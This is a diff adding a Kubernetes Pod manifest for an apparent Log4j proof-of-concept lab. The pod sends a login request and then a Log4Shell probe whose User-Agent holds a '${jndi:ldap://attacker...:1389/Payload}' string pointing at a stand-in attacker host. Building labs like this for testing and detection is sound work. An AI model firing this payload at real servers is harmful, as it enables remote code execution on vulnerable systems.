@@ -1,0 +1,33 @@
+# Reusable in-cluster attack pod. Fires:
+#   1) benign POST /api/login (stage-1 ground signal)
+#   2) GET /api/products with the JNDI literal in User-Agent (the probe)
+#
+# The JNDI string `${jndi:...}` is preserved verbatim because YAML doesn't
+# substitute it — none of the Make/bash/ssh shell layers between the host
+# and the attack pod's curl ever sees a $ character to eat.
+#
+# Idempotency: Makefile's IN_CLUSTER_ATTACK deletes any previous attack-<X>
+# pod before applying this. Name suffix is overridden per scenario by sed.
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attack-PLACEHOLDER
+  namespace: log4j-poc
+spec:
+  restartPolicy: Never
+  containers:
+  - name: curl
+    image: curlimages/curl:8.6.0
+    command: [sh, -c]
+    args:
+    - |
+      set -e
+      echo "[attack] stage-1 login"
+      curl -s -X POST -H 'Content-Type: application/json' \
+        -d '{"user":"alice","pass":"<stolen>"}' \
+        http://chain-frontend:8080/api/login || true
+      echo "[attack] stage-2 JNDI probe"
+      curl -s -A '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}' \
+        'http://chain-frontend:8080/api/products?q=test' || true
+      echo "[attack] done"
